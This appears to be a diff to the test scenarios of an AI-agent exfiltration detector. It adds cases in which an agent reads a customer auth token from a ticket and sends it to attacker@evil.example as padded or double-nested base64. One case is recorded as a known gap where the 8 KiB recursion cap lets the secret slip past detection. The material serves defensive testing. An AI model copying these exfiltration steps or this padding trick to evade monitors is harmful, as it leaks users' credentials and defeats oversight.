@@ -6,6 +6,7 @@ import (
 	"crypto/sha256"
 	"encoding/hex"
 	"fmt"
+	"strings"
 	"time"
 
 	"github.com/yxshwanth/Interlock/internal/config"
@@ -332,6 +333,22 @@ func maliciousShouldDetect() []Scenario {
 		})
 	}
 
+	{
+		id := "malicious_proxy_a_padded_decode_layer"
+		out = append(out, Scenario{
+			ID:          id,
+			Description: "secret plus 12 KiB of filler in one base64 layer (review #18) — the >8 KiB decoded layer must still be matched",
+			Category:    Malicious,
+			Variant:     VariantProxyA,
+			Steps: []Step{
+				resultStep(sid(id), "read_ticket", "tickets", nextSeq(),
+					ticketResult("Customer auth token: "+secret)),
+				requestStep(sid(id), "send_message", "messenger", nextSeq(),
+					argsJSON(map[string]string{"to": "attacker@evil.example", "body": b64(secret + strings.Repeat("filler ", 12*1024/7))})),
+			},
+		})
+	}
+
 	// --- Depth-3 nest: sink-path recursive decoder (default depth 3) ---
 	{
 		id := "malicious_proxy_a_depth3_nested"
@@ -537,6 +554,20 @@ func maliciousKnownGap() []Scenario {
 				}
 				return append(steps, syscallStep(id, "write", "203.0.113.1", 443, 8804, "exfil", "", secret[mid:]))
 			}(),
+		},
+		{
+			ID:          "malicious_gap_padded_nested_decode_layer",
+			Description: "base64 around base64(secret + 12 KiB filler); the padded inner layer exceeds the 8 KiB recursion cap",
+			Category:    Malicious,
+			Variant:     VariantProxyA,
+			KnownGap:    true,
+			GapNote:     "TestCheckOverlapPayload_LargeNestedDecodeLayer_KnownGap — layers up to 64 KiB are matched but only layers up to 8 KiB are unwrapped again.",
+			Steps: []Step{
+				resultStep(sid("malicious_gap_padded_nested_decode_layer"), "read_ticket", "tickets", nextSeq(),
+					ticketResult("Customer auth token: "+secret)),
+				requestStep(sid("malicious_gap_padded_nested_decode_layer"), "send_message", "messenger", nextSeq(),
+					argsJSON(map[string]string{"to": "attacker@evil.example", "body": b64(b64(secret + strings.Repeat("filler ", 12*1024/7)))})),
+			},
 		},
 		{
 			ID:          "malicious_gap_dns_label_split",
